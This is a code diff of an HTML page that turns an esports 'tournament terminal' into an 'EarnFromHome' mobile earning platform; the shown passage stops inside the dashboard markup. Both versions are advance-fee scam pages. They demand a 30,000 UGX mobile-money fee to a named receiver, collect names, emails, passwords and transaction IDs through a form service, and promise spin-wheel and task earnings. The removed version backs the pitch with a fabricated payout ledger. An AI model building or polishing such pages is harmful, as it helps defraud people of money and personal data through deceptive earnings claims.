@@ -3,145 +3,129 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Esports Skill Tournament Terminal</title>
+<title>EarnFromHome - Mobile Platform</title>
 <style>
-body { font-family: 'Courier New', Courier, monospace; background: #0a0a0c; color: #00ff66; margin: 0; padding: 20px; box-sizing: border-box; }
-.wrapper { max-width: 600px; margin: 0 auto; }
-h1, h2, h3 { text-align: center; text-transform: uppercase; letter-spacing: 2px; color: #fff; text-shadow: 0 0 10px #00ff66; }
-.panel { background: #121216; border: 2px solid #333; border-radius: 4px; padding: 20px; margin-bottom: 20px; box-shadow: inset 0 0 15px rgba(0,0,0,0.8); }
-.accent-border { border-color: #00ff66; }
-.timer-box { font-size: 24px; text-align: center; font-weight: bold; color: #ff3366; text-shadow: 0 0 10px #ff3366; margin: 10px 0; }
-input, select, button { width: 100%; box-sizing: border-box; padding: 12px; margin: 8px 0; background: #1a1a24; border: 1px solid #00ff66; color: #00ff66; font-family: inherit; font-size: 16px; border-radius: 4px; }
-button { background: #00ff66; color: #000; font-weight: bold; cursor: pointer; transition: 0.2s; text-transform: uppercase; border: none; }
-button:hover { background: #fff; box-shadow: 0 0 15px #00ff66; }
-button:disabled { background: #333; color: #777; cursor: not-allowed; box-shadow: none; }
-.hidden { display: none; }
-.stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; }
-.stat-card { background: #1a1a24; padding: 10px; border-radius: 4px; text-align: center; border: 1px solid #333; }
-.game-zone { width: 100%; height: 200px; background: #000; border: 2px dashed #00ff66; position: relative; cursor: pointer; display: flex; justify-content: center; align-items: center; overflow: hidden; margin-top: 15px; }
-#click-target { width: 60px; height: 60px; background: #ff3366; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-weight: bold; position: absolute; box-shadow: 0 0 15px #ff3366; user-select: none; }
-table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 14px; }
-th, td { border: 1px solid #333; padding: 8px; text-align: left; }
-th { background: #1a1a24; color: #fff; }
+:root { --primary: #0066cc; --primary-light: #e6f0ff; --accent: #ff9900; --danger: #ff3333; --text: #333333; --bg: #f4f7f6; --card: #ffffff; }
+* { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+body { background: var(--bg); color: var(--text); margin: 0; padding: 0; display: flex; justify-content: center; }
+.phone-container { width: 100%; max-width: 450px; min-height: 100vh; background: var(--card); display: flex; flex-direction: column; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.05); padding-bottom: 70px; }
+.header { background: var(--primary); color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 18px; display: flex; justify-content: space-between; align-items: center; }
+.balance-badge { background: rgba(255,255,255,0.2); padding: 5px 10px; border-radius: 20px; font-size: 14px; }
+.content { padding: 15px; flex: 1; }
+.card { background: var(--card); border-radius: 12px; padding: 15px; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.03); border: 1px solid #eeeeee; }
+.btn { width: 100%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 15px; cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px; transition: 0.2s; margin-top: 5px; }
+.btn:hover { opacity: 0.9; }
+.btn-accent { background: var(--accent); color: white; }
+.btn-outline { background: transparent; border: 2px solid var(--primary); color: var(--primary); }
+input, select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #cccccc; border-radius: 8px; font-size: 15px; background: #fafafa; }
+.hidden { display: none !important; }
+
+/* Navigation Bottom Bar Layout */
+.bottom-nav { position: fixed; bottom: 0; width: 100%; max-width: 450px; background: var(--card); height: 65px; border-top: 1px solid #eeeeee; display: flex; justify-content: space-around; align-items: center; z-index: 100; }
+.nav-item { flex: 1; text-align: center; color: #777777; font-size: 11px; font-weight: 500; cursor: pointer; display: flex; flex-direction: column; align-items: center; }
+.nav-item.active { color: var(--primary); font-weight: bold; }
+.nav-icon { font-size: 20px; margin-bottom: 2px; }
+
+/* Custom Spin Wheel Mechanics Elements */
+.wheel-box { display: flex; flex-direction: column; align-items: center; margin: 15px 0; }
+.wheel-canvas { width: 180px; height: 180px; border-radius: 50%; border: 5px solid var(--primary); display: flex; justify-content: center; align-items: center; background: conic-gradient(from 0deg, #ff3333 0deg 60deg, #33ccff 60deg 120deg, #ffcc00 120deg 180deg, #33cc33 180deg 240deg, #cc33ff 240deg 300deg, #ff9900 300deg 360deg); position: relative; transition: transform 3s cubic-bezier(0.1, 0.8, 0.3, 1); }
+.wheel-pointer { width: 0; height: 0; border-left: 10px solid transparent; border-right: 10px solid transparent; border-bottom: 20px solid var(--primary); position: absolute; top: -15px; z-index: 10; }
+.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+.badge { background: var(--primary-light); color: var(--primary); padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; display: inline-block; }
 </style>
 </head>
 <body>
-<div class="wrapper">
 
-<h1>// TOURNAMENT_TERMINAL</h1>
-
-<!-- SIGNUP REGISTRATION LAYER -->
-<div id="gate-panel" class="panel accent-border">
-<h2>[ ACCESS LOCKED ]</h2>
-<div style="background:#1a1a24; padding:15px; border-radius:4px; margin-bottom:15px; font-size:13px; color:#fff; border:1px solid #333;">
-<strong style="color:#00ff66;">📢 REGISTRATION INSTRUCTIONS:</strong><br>
-1. Send exactly <strong>30,000 UGX</strong> to our mobile money line.<br>
-2. Copy the Txn ID code from your incoming network message.<br>
-3. Submit it below. You will receive an activation key via contact.
+<div class="phone-container">
+<!-- CORE SYSTEM APP HEADER -->
+<div class="header">
+<span>📱 EarnFromHome</span>
+<span class="balance-badge" id="header-bal">0 UGX</span>
 </div>
 
-<form action="https://formspree.io" method="POST" id="registration-proof-form">
-<input type="tel" name="User Phone Node" placeholder="YOUR ACCOUNT PHONE NUMBER" required>
-<input type="text" name="Payment Transaction ID" placeholder="PASTE MOBILE MONEY TXN ID HERE" required>
-<button type="submit" id="reg-submit-btn">1. Submit Payout Verification Request</button>
-</form>
+<!-- MAIN VIEW CONTAINER FRAMEWORK -->
+<div class="content">
 
-<hr style="border-color: #333; margin: 20px 0;">
-<p>Already have your 6-digit verification code? Enter it below to unlock access instantly:</p>
-<input type="text" id="activation-input" placeholder="ENTER 6-DIGIT ACTIVATION CODE">
-<button onclick="checkAccessCode()" style="background:#fff; color:#000;">2. Unlock System Terminal</button>
+<!-- SIGHTSEEING PANELS (UNREGISTERED WORKSPACE VIEW) -->
+<div id="view-guest" class="panel">
+<div class="card" style="text-align: center;">
+<h2>Welcome Partner! 💰</h2>
+<p>Browse our custom earning modules freely. To unlock real money accumulation structures, you must register into the active client terminal database layers.</p>
+<button class="btn" onclick="switchNav('register')">Create Your Account</button>
 </div>
 
-<!-- MAIN ACTIVE SYSTEM APPLICATION -->
-<div id="main-application" class="hidden">
-
-<!-- TOURNAMENT CLOCK & TELEMETRY -->
-<div class="panel">
-<h3>Tournament Engine Status</h3>
-<div class="timer-box" id="countdown-clock">16h 00m 00s</div>
-<p style="font-size:12px; text-align:center; color:#fff; margin:0 0 10px 0;">🔥 Person with highest tickets at clock expiration wins the pooled daily payout seat cash!</p>
-<div class="stats-grid">
-<div class="stat-card">
-<div>Your Wallet</div>
-<strong style="color: #fff; font-size: 18px;" id="balance-display">0 UGX</strong>
+<div class="card">
+<h3>🎡 Premium Spin Wheel Array</h3>
+<div class="wheel-box">
+<div class="wheel-pointer"></div>
+<div class="wheel-canvas" id="guest-wheel"></div>
 </div>
-<div class="stat-card">
-<div>Tournament Tickets</div>
-<strong style="color: #fff; font-size: 18px;" id="ticket-display">0 Tickets</strong>
-</div>
+<button class="btn btn-outline" onclick="triggerGateAlert()">Spin To Earn</button>
 </div>
 </div>
 
-<!-- CLICKER CORE GAME MODULE -->
-<div class="panel accent-border">
-<h3>Task Matrix: Target Reaction Vector</h3>
-<p>Click the red matrix target vector as fast as it moves to harvest UGX and entry tickets.</p>
-<div class="game-zone" id="arena" onclick="missClick()">
-<div id="click-target" onclick="hitTarget(event)">HIT</div>
+<!-- ONBOARDING SUITE: PROFILE PARAMETERS FORM -->
+<div id="view-register" class="panel hidden">
+<div class="card">
+<h3>📝 Platform Identity Registration</h3>
+<input type="text" id="reg-fn" placeholder="First Name">
+<input type="text" id="reg-ln" placeholder="Last Name">
+<input type="email" id="reg-email" placeholder="Email Address">
+<input type="text" id="reg-user" placeholder="Choose Username">
+<input type="password" id="reg-pass" placeholder="Password">
+<input type="password" id="reg-confirm" placeholder="Confirm Password">
+<label style="font-size: 13px; display: block; margin: 10px 0;">
+<input type="checkbox" id="reg-terms" style="width: auto; margin-right: 5px;"> I agree to terms and conditions protocols.
+</label>
+<button class="btn" onclick="processRegistrationData()">Continue to Payment</button>
 </div>
 </div>
 
-<!-- TASK ARCHITECTURE MODULE WITH TIME-LOCK ANTI-SPAM -->
-<div class="panel accent-border">
-<h3>📋 Premium Task Matrix (Earn UGX via Review)</h3>
-<p style="color: #ff3366; font-size: 12px;">⚠️ NOTICE: Payout audits cross-check submissions within 24 hours. Spamming fake details resets browser balance to zero.</p>
-
-<div id="tasks-container">
-<!-- Task item 1 -->
-<div class="stat-card" id="task-1-box" style="margin-bottom: 15px; text-align: left; padding: 15px;">
-<strong>Task #1: Follow & Review Sponsor Page</strong><br>
-<span style="color:#00ff66; font-size:14px;">Reward: +3,500 UGX | +10 Tickets</span><br>
-<a href="https://example.com" target="_blank" style="display:inline-block; margin-bottom:10px;">
-<button style="width: auto; padding: 5px 15px; font-size: 14px;">1. Launch Task Link 🔗</button>
-</a>
-<form action="https://formspree.io" method="POST" class="task-proof-form" data-task-id="task-1-box" data-cash="3500" data-tickets="10">
-<input type="text" name="Verification Username" placeholder="Enter Your Username Used For Task" required>
-<input type="hidden" name="Task ID" value="Task #1: Follow & Review Sponsor Page">
-<button type="submit" style="background:#fff; color:#000; width:auto; padding:5px 15px; font-size:14px; margin-top:5px;">2. Claim Task Payout</button>
-</form>
+<!-- ONBOARDING SUITE: OUTGOING FEE LOGGING PANEL -->
+<div id="view-payment" class="panel hidden">
+<div class="card" style="border-left: 5px solid var(--accent);">
+<h3>💳 Registration Entry Fee Disbursal</h3>
+<p>To successfully activate real UGX balance processing matrices, you must submit the system registration fee requirement:</p>
+<div style="background: #fff9e6; padding: 12px; border-radius: 8px; border: 1px solid #ffe0b3; font-size: 14px; margin-bottom: 12px;">
+💸 Amount Required: <strong>30,000 UGX</strong> (+ network tax cents)<br>
+📱 Receiver Number: <strong>+256707281801</strong> (Airtel Line)<br>
+👤 Account Holder: <strong>Mukisa Raphael</strong>
 </div>
+<p style="font-size: 13px; color: #666;">Submit your matching mobile phone number line and transaction ID string details below for administrator ledger auditing:</p>
 
-<!-- Task item 2 -->
-<div class="stat-card" id="task-2-box" style="margin-bottom: 15px; text-align: left; padding: 15px;">
-<strong>Task #2: Complete Partner Survey Form</strong><br>
-<span style="color:#00ff66; font-size:14px;">Reward: +5,000 UGX | +15 Tickets</span><br>
-<a href="https://example.com" target="_blank" style="display:inline-block; margin-bottom:10px;">
-<button style="width: auto; padding: 5px 15px; font-size: 14px;">1. Launch Task Link 🔗</button>
-</a>
-<form action="https://formspree.io" method="POST" class="task-proof-form" data-task-id="task-2-box" data-cash="5000" data-tickets="15">
-<input type="text" name="Survey Email Used" placeholder="Enter Email Used For Survey" required>
-<input type="hidden" name="Task ID" value="Task #2: Complete Partner Survey Form">
-<button type="submit" style="background:#fff; color:#000; width:auto; padding:5px 15px; font-size:14px; margin-top:5px;">2. Claim Task Payout</button>
+<form action="https://formspree.io" method="POST" id="proof-submission-form" onsubmit="handleProofSubmit(event)">
+<input type="hidden" name="Form Classification" value="New Account Registration Entry Proof Logger">
+<input type="text" name="First Name" id="form-fn" hidden>
+<input type="text" name="Last Name" id="form-ln" hidden>
+<input type="email" name="User Email" id="form-email" hidden>
+<input type="text" name="Account Username" id="form-user" hidden>
+
+<input type="tel" name="Sender Phone Line" placeholder="Your Outgoing Mobile Money Line" required>
+<input type="text" name="Transaction ID / Name String" placeholder="Transaction Reference ID or Full Name" required>
+<button type="submit" class="btn btn-accent">Submit Verification Request</button>
 </form>
 </div>
 </div>
+
+<!-- ONBOARDING SUITE: TRANSACTION VERIFICATION TIMELINE VIEW -->
+<div id="view-waiting" class="panel hidden">
+<div class="card" style="text-align: center; border-left: 5px solid var(--primary);">
+<h3 style="color: var(--primary);">⏳ Matrix System Pending Validation</h3>
+<div style="margin: 20px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite;"></div>
+<p><strong>Please wait, as we process things...</strong></p>
+<p style="font-size: 13px; color: #555; text-align: left; background: #fafafa; padding: 10px; border-radius: 6px;">
+The system has packaged your tracking logs down to our dashboard queue at <strong>MukisaRaphael3@gmail.com</strong>. Once we verify the incoming mobile money matches your submitted user details, a 6-digit access token string will be dispatched from <strong>Earnfromhome1@gmail.com</strong>.
+</p>
+<hr style="border-color: #eee; margin: 15px 0;">
+<p style="font-size: 14px;">Paste the 6-digit key code string received inside your inbox or spam folder below:</p>
+<input type="text" id="activation-key-entry" placeholder="ENTER 6-DIGIT REVENUE CODE">
+<button class="btn" onclick="verifyActivationKeyString()">Activate Platform Workspace</button>
+</div>
 </div>
 
-<!-- REFERRAL MANAGEMENT ENGINE -->
-<div class="panel">
-<h3>Affiliate Pipeline System</h3>
-<p>Earn an extra <strong>5,000 UGX</strong> added to your live wallet balance whenever an invited partner registers using your route link.</p>
-<input type="tel" id="affiliate-phone" placeholder="Enter Your Payout Phone Number">
-<button onclick="createAffiliateLink()">Generate Referral Link</button>
-<input type="text" id="invite-link-box" readonly placeholder="Your generated link will appear here..." style="color: #fff; border-color: #333;">
-</div>
-
-<!-- PUBLIC TRUST LEDGER SCREEN -->
-<div class="panel">
-<h3>Live Ledger Transactions Verification</h3>
-<table>
-<thead>
-<tr><th>User ID</th><th>Type</th><th>Value</th><th>Status</th></tr>
-</thead>
-<tbody>
-<tr><td>077801</td><td>Registration Fee</td><td>30,000 UGX</td><td><span style="color:#00ff66;">ACTIVE</span></td></tr>
-<tr><td>070152</td><td>System Payout</td><td>65,000 UGX</td><td><span style="color:#fff;">DISBURSED</span></td></tr>
-<tr><td>078****994</td><td>Registration Fee</td><td>30,000 UGX</td><td><span style="color:#00ff66;">ACTIVE</span></td></tr>
-</tbody>
-</table>
-</div>
-
-<!-- WITHDRAWAL CONTROL BOARD -->
-<div class="panel" style="border-color: #ff3366;">
-<h3>Payout Withdrawal Settlement</h3>
-<p>System Balance payout threshold limit: <strong>50,000 UGX</strong></p>
+<!-- AUTHENTICATED SYSTEM SUITE INTERFACE DASHBOARD (LOCKED UNTIL CODE ACTIVATION) -->
+<div id="view-dashboard" class="panel hidden">
+<!-- Active Balances Metrics Panel -->
+<div class="card" style="background: linear-gradient(135deg, var(--primary), #004499); color: white;">
+<h3 style="margin-top: 0; font-size: 15px; opacity: 0.9;">Verified Profile Workspace</h3>
+<div class="grid-2">
